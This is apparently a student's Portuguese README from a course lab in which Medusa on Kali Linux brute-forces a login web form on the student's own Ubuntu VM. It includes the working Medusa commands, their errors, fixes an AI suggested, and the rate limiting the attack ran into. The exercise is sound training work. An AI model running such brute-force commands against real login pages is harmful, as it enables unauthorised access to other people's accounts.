# Simulando-um-Ataque-de-Brute-Force-de-Senhas-com-Medusa-e-Kali-Linux
Repositorio da aula Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux - DIO/Santander


Objetivo: Utilizar do conhecimento adquirido para atacar cópia de sistema póprio que utiliza de web-form

Materiais: Kali Linux com Medusa e VM UBUNTU SERVER

Pratica: Foi realizado acesso a VM UBUNTU para coleta de IP, após isso acessamos pelo Kali Linux no Firefox a pagina alvo do ataque, que contem um formulario de login. 

Nas opções de desenvolvedores, aba network, realizei simulação de acesso incorreto para capturar parametros de envio do formulario e de acesso, bem como mensagem de erro para usar como condicional de saida do Medusa.

////////////////////////////////////////////////////////////////////////////////////
após isso montei o script como mostrado na aula, o script montado foi o seguinte:

medusa -h 192.168.56.103:3000 -U userTeste.txt -P passTeste.txt -M http \
-m PAGE: '/login' \
-m FORM: 'login=^USER^&senha=^PASS^&Entrar=login' \
-m 'FAIL=Login ou senha inválidos' -t 6

////////////////////////////////////////////////////////////////////////////////////


Este script não funcionou e recebi a seguinte mensagem:

┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.56.103 -U userTeste.txt -P passTeste.txt -M http \ 
-m PAGE: ':3000/login' \
-m FORM: 'login=^USER^&senha=^PASS^&Entrar=login' \
-m 'FAIL=Login ou senha inválidos' -t 6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

WARNING: Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login ou senha inv[C3][A1]lidos.
NOTICE: http.mod: failed to connect, port 80 was not open on 192.168.56.103

/////////////////////////////////////////////////////////////////////////////////////////////

Fui inspecionar o motivo com I.A e fui informado que a contrução do script estava incorreta e o certo seria tudo em uma unica linha, dessa maneira:

medusa -h 192.168.56.103 -n 3000 -U userTeste.txt -P passTeste.txt -M web-form \
-m FORM:"/login:login=^USER^&senha=^PASS^&Entrar=login:F=Login ou senha inválidos" -t 6

/////////////////////////////////////////////////////////////////////////////////////////////

Rodei novamente e as wordlists criadas por mim que contiam a creddencial correta estava contruido de forma sequencial e não em lista, então corrigi e rodei novamente e continuou em erro:

Consultei I.A novamente e me informou necessidade de um $ ao final das palavras.

Continuei na execução, dessa vez recebi outro erro, o motivo era o caminho especificado que estava incorreto com :3000/login e o correto era: http://192.168.56.103:3000/api/auth/login


Utilizei dessa URL e funcionou, consegui executar o medusa, mas mesmo assim alcançamos o toomanyrequest, sigo em estudo para atualizar e conseguir quebrar o acesso, em consulta vejo que um caminho auxiliar é script em python devido os parametros de acesso serem em JSON

